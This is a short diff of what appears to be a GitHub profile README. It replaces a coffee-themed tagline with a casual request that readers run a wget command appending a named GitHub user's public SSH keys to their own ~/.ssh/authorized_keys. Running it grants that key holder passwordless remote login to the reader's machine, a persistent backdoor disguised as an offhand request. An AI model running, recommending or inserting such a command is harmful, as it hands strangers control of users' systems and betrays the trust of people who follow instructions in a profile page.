@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-☕ Code, coffee, repeat. The circle of productivity.
+✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
 
 <!--✏️ **Blog Posts**-->
 
@@ -21,4 +21,4 @@
 
 🕒 **Last Update**
 
-16-04-2025 16:22:36 UTC
+16-04-2025 20:20:01 UTC
